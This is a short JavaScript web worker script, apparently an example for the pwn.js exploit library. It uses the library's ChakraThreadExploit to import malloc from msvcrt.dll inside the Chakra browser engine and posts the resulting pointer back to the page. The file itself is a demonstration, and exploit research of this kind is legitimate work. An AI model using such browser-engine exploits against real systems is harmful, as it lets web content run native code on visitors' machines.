importScripts('../dist/pwn.js');

with (new pwnjs.ChakraThreadExploit()) {
    var malloc = importFunction('msvcrt.dll', 'malloc', Uint8Ptr);
    postMessage(malloc(8).toString());
}
